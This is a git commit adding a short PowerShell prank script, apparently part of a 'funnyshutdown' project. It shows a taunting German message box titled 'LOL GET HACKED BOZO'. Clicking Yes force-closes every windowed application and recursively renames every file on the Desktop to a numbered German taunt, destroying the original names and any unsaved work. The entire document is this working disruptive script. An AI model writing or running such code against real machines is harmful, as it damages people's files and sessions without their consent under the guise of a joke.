594fc9582cd0940c1501811f2a75a6c766f53f67
CoolGermanGuy <88776295+CGGonGitHub@users.noreply.github.com>
2023-07-17 17:59:34 +0200

    Create AfterRestartNo.ps1

---
+++ funnyshutdown/AfterRestartNo.ps1
@@ -0,0 +1,13 @@
+Add-Type -AssemblyName PresentationCore, PresentationFramework
+$Result = [System.Windows.MessageBox]::Show('Dachtest du wirklich du entkommst mir so einfach?' ,'LOL GET HACKED BOZO' ,'YesNo' ,'Question')
+switch($Result){
+    'Yes' {
+        Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Stop-Process
+        cd Desktop
+        $counter = 0
+        Get-ChildItem -Recurse | ForEach-Object {
+            $_ | Rename-Item -NewName "DU ENTKOMMST MIR NICHT $(($counter++))$($_.Extension)"
+        }
+    }
+    'No' {[System.Windows.MessageBox]::Show('Besser isses, tschüss jetzt.' ,'Dann hör ich mal lieber auf' ,'Ok' ,'Information')}
+}
